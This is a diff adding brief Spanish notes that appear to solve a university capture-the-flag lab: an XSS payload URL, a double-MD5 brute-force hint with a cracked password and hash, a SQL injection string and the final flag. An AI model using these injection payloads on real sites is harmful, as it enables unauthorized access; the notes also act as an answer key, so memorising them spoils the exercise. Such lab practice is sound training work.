@@ -1,0 +1,16 @@
+inyeccion XSS en pagina principal
+https://nemeziz.dsa.linti.unlp.edu.ar/?payload=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+¡Bien hecho! Ahora inicia sesión con el usuario 'pedro'
+
+Pista: ni sal ni pimienta, solo doble cocción.
+
+
+FuerzaBruta con doble hash MD5
+contraseña: password123
+Hash necesario: 9df7a7314e3884b26222e2ccd834aa24
+
+
+SQLI en buscar sucursal: 'OR'1
+
+flag{N3m3z1z_w4s_here}
